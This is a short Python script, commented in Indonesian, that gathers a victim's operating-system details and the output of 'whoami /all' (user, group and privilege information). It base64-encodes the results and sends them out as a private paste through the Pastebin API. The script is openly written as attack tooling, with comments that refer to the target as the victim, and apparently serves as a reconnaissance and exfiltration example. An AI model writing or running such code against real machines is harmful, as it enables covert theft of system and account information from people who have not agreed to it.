import requests, base64, platform
from subprocess import PIPE, Popen

# Deklarasi Encpoint dan Developer API Key
API_ENDPOINT = "https://pastebin.com/api/api_post.php"
API_KEY = "<UNIQUE_DEVELOPER_API_KEY>"

message = "Recon result\n"

# Meng-append OS dan Versi OS milik korban ke message yang akan dikirim
message += f"Victim's OS: {platform.platform()}\n\n"

# Mengeksekusi command "whoami /all" pada shell milik korban yang akan mengirimkan info user, info group, dan privileges
process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
result, error = process.communicate()

# Meng-append hasil mengeksekusi command ke message 
if result == b'':
    message += error.decode()
else:
    message += result.decode()

# Melakukan encode Base64 kepada pesan
message = base64.b64encode(message.encode())

# Body Request yang akan dikirimkan ke API Endpoint
data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_private': '1',
    'api_paste_code': message
}

# Mengirimkan request menggunakan method POST dan menampilkan link pastebin
resp = requests.post(url=API_ENDPOINT, data=data)
pastebin_url = resp.text
print(f"URL: {pastebin_url}")
